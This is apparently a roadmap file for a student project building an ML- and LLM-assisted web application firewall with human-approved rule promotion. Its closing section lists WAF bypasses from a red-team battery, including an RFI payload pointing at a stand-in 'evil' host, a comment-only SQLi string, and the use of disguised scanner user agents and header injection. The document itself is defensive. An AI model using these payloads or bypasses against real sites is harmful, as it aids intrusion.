# FYP-II roadmap

Working branch: `fyp-II` (off `main`). **All 11 SRS modules done** as of
2026-05-24 (`751772e`). Phases B–D shipped; current focus is on the
optional / research-grade items in `todo.md` at repo root.

## Phase plan (historic)

| Phase | SRS Modules | Backend | Dashboard |
|---|---|---|---|
| ~~A~~ | ~~M3 (FE-2 finish)~~ | **DONE 2026-05-22 on fyp-II.** Spamhaus DROP+EDROP fetched on boot + every 12h via `internal/threatintel`, atomic data-file rewrite, `coraza.Engine.Reload()` hot-swaps the WAF. Status at `GET /__threatintel`. Rule 1500001 phase:1. | ✓ "Threat intel" status card shipped. |
| ~~B~~ | ~~M8 + M9~~ | **DONE on fyp-II (`12722b6`, `e7e2378`).** FP-Growth in `ml/app/mining/`; rulegen orchestrator with stub renderer + Gemini Flash provider (`LLM_PROVIDER` env switch, falls back to stub when no key). | ✓ Rules tab with mining controls + candidate table + edit modal + Preview matches. |
| ~~C~~ | ~~M10~~ | **DONE on fyp-II (`12722b6`).** State machine in `rules_queue`; promoter writes `lg-<id>.conf` to shared volume + POSTs proxy `/__reload` (signed JWT). HITL on RULES, not individual requests. | ✓ Approve / Reject / Edit / Expire / Delete with role-gated buttons and edit history. |
| ~~D~~ | ~~Auth + M11~~ | **DONE on fyp-II (`5a9843d`, `8782d2c`, `9ff3845`, `0429824`).** JWT auth + RBAC (4 roles: admin / security-operator / ml-engineer / auditor) + MFA (TOTP) + account lockout + brute-force watch; M11 full with drift watcher + HITL **model** promotion gate. | ✓ Login (two-stage MFA); Users tab; topbar v2 rollup health pill; role strip + READ ONLY cards for non-mutator roles; Model Promotion queue card. |

## What's next (optional; tracked in `/todo.md`)

The five top-priority items + the five high-impact items are **all
shipped**. Remaining work is split across:
- **Medium-impact**: SHAP/LIME, MISP/OTX feeds, auto-FP correction,
  rule-effectiveness scoring, WS/HTTP2/gRPC inspection.
- **Compliance / chapter-padding**: AES-256 at rest, LDAP/SSO, PCI/HIPAA
  auto-reports, CSV/JSON export, keyboard shortcuts. Skip unless asked.
- **Deployment & ops**: K8s/Helm, HPA, multi-tenancy, Prometheus/Grafana,
  encrypted backups.
- **ML research-grade**: VAE/Transformer, federated learning,
  GPU/INT8 quantisation. See the "Research-paper roadmap" section at
  the bottom of `todo.md` for Path A (systems paper) vs Path B (ML
  novelty) framing.

## Confirmed design constraints from mockups (binding)

- **3 consensus modes** (Weighted / Majority / Strict), **per-model weight
  sliders summing to 100**, decision-threshold slider (default 0.65),
  Recent Decisions table with per-model scores + Override.
- **M3 per-model cards** showing version, last-trained, reconstruction
  error / cluster count, threshold, FPR; with Retrain / Adjust Threshold /
  Re-cluster buttons.
- **M5 / HITL** screen for proposed RULES (not requests) with Approve /
  Reject and audit of who approved.
- **Top-nav dashboard**: Alerts / Analytics / Settings / Reports / Profile.
- **LLM is a formal system actor**, not optional — the LLM API integration
  is in scope.

## Honest gaps to soften in the final report

- M11 will be scheduled (cron-style), not online — calling it "continuous
  learning" in the strict streaming sense is a stretch.
- LLM throughput capped by free-tier rate limits — fine for demo, document
  the constraint.
- **P95 latency P95 ≈ 170 ms vs 150 ms NFR target.** Cause: per-request
  Keras `predict` over a tiny batch incurs ~30 ms framework overhead even
  on a 7→…→7 MLP. Documented and acceptable for a research prototype;
  future tightening would batch requests or convert the AE to ONNX/tflite.
- **TPR on CSIC is ~27 %**, basically rule-only baseline since the ML model
  is fit to Juice Shop. The 7 numeric features (length, entropy, etc.)
  cannot distinguish many CSIC attacks whose payload shape mimics benign
  forms — the differentiator is *content* (SQL keywords, traversal
  sequences) which is precisely what Coraza handles. The two layers are
  complementary, not redundant; future M4 work could expand features
  (n-gram entropy, payload class) without changing the architecture.

## Concrete attack leaks that motivate Phase B

The 141-payload red-team battery (see `attacks/run_attacks.py`) has 16-21
known leaks across:
- **RFI** 0/4 — `?page=http://evil/x.sh` patterns slip past CRS.
- **SQLi** comment-only payloads (`admin'#`) — no SQL keywords for regex to match.
- **LDAP** 2/4 — Coraza weak on LDAP injection (not CRS focus).
- **Scanner UAs** 7/10 — disguised UA strings (Acunetix-Aspect,
  "Burp Collaborator", ZAP) bypass the simple regex.
- **XFF SQLi** — header-based SQLi not inspected at default paranoia.

These are gold for the FYP-II demo arc: run battery → show leaks → mine
patterns from confirmed-block audit rows → LLM proposes new SecRules →
human approves → re-run battery → leaks close.
